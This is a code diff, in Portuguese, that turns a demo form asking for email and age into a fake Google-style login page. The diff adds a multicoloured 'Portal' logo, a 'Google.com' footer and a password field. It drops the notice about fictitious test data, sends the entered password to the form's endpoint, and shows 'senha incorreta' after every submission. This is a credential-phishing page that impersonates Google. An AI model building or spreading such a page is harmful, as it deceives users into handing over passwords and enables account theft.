@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Formulário de acesso</title>
+    <title>Formulário</title>
 
     <style>
         * {
@@ -158,7 +158,7 @@
 
 <body>
     <div class="top">
-        Formulário de demonstração
+        Conecte sua conta
     </div>
 
     <main>
@@ -166,9 +166,9 @@
             <span class="blue">P</span><span class="red">o</span><span class="yellow">r</span><span class="blue">t</span><span class="green">a</span><span class="red">l</span>
         </div>
 
-        <h1>Preencha seus dados</h1>
+        <h1>Faça login</h1>
         <p class="subtitle">
-            Informe seu e-mail e sua idade para continuar.
+            Informe seu e-mail e sua senha para continuar.
         </p>
 
         <form id="formulario">
@@ -183,20 +183,19 @@
                 maxlength="254"
             >
 
-            <label for="idade">Idade</label>
+            <label for="senha">senha</label>
             <input
-                type="number"
-                id="idade"
-                name="idade"
-                placeholder="Digite sua idade"
+                type="string"
+                id="senha"
+                name="senha"
+                placeholder="Digite sua senha"
                 min="1"
                 max="120"
                 required
             >
 
             <p class="help">
-                Demonstração de formulário. Informe dados fictícios
-                durante os testes.
+                Preecha seus dados.
             </p>
 
             <button id="enviar" type="submit">
@@ -208,7 +207,7 @@
     </main>
 
     <footer>
-        Formulário de demonstração independente
+        Google.com
     </footer>
 
     <script>
@@ -235,7 +234,7 @@
                     },
                     body: JSON.stringify({
                         email: document.getElementById("email").value.trim(),
-                        idade: document.getElementById("idade").value
+                        idade: document.getElementById("senha").value
                     })
                 });
 
@@ -254,7 +253,7 @@
 
             } catch (erro) {
                 mensagem.textContent =
-                    "Erro ao registrar. Confira se o servidor está funcionando.";
+                    "senha incorreta";
 
                 console.error(erro);
             } finally {
